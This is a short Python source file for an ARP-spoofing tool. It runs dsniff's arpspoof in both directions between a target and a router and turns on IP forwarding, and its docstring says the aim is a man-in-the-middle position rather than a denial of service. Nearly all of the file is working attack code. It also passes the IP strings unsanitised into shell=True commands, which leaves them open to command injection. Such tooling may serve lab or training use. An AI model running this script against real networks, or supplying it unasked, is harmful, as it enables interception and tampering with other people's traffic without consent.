import subprocess
import os
import signal


class ArpSpoof:
    IP_FORWARD = r"echo 1 > /proc/sys/net/ipv4/ip_forward"

    def __init__(self, target_ip, router_ip):
        self.target_ip = target_ip
        self.router_ip = router_ip
        self.process_list = []

    def start_spoof(self):
        """
        1) Runs arpspoof from dsniff on linux
           Command in the form of: arpspoof -t 10.13.37.1 10.13.37.124

        2) echo 1 > /proc/sys/net/ipv4/ip_forward
           Command used to let traffic through both ways. Without this then we would create a DOS instead
           of a MITM

        3) store subprocess so we can kill them later

        :return: None
        """
        command_1 = r"arpspoof -t " + self.target_ip + " " + self.router_ip
        command_2 = r"arpspoof -t " + self.router_ip + " " + self.target_ip
        self.process_list.append(subprocess.Popen(ArpSpoof.IP_FORWARD, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid))
        self.process_list.append(subprocess.Popen(command_1, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid))
        self.process_list.append(subprocess.Popen(command_2, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid))

    def stop_spoof(self):
        """
        Iterate list of process and kill them

        :return: None
        """
        for process in self.process_list:
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
